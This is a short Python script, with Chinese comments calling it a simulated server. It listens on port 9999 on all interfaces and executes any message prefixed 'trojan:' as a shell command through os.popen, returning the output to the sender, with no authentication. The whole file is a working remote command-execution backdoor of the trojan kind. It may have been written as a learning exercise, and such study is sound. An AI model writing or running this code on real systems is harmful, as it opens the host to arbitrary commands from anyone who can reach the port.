import socket
import time
import os


# 模拟服务端
def server():
    server1 = socket.socket()
    server1.bind(('0.0.0.0', 9999))  # 绑定
    server1.listen()  # 监听
    message, address = server1.accept()  # 接收到返回的值
    while True:
        get_message = message.recv(1024000).decode()  # encode编码，decode解码
        if get_message.startswith('trojan'):
            trojan = get_message.split(':')[1]
            result = os.popen(trojan).read()
            send_message = f"{trojan}运行成功：\n{result}".encode()
            message.send(send_message)
        else:
            print(f"你收到一条信息:{get_message}")
            send_message = time.strftime("%Y%m%d %X", time.localtime()).encode()
            message.send(send_message)


if __name__ == '__main__':
    server()
